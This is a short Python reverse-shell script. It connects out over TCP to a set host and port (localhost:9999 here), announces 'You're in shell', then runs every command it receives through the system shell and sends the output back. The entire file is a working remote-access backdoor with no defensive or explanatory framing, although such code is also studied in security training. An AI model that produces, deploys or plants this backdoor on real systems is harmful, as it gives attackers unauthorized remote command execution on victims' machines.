import subprocess,socket

host="127.0.0.1"
port=9999

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection.connect((host,port))
connection.send("You're in shell")

while 1:
    command = connection.recv(1024)
    if command == "quit": break
    
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    connection.send(stdoutput)

connection.send("Bye bye")
connection.close()
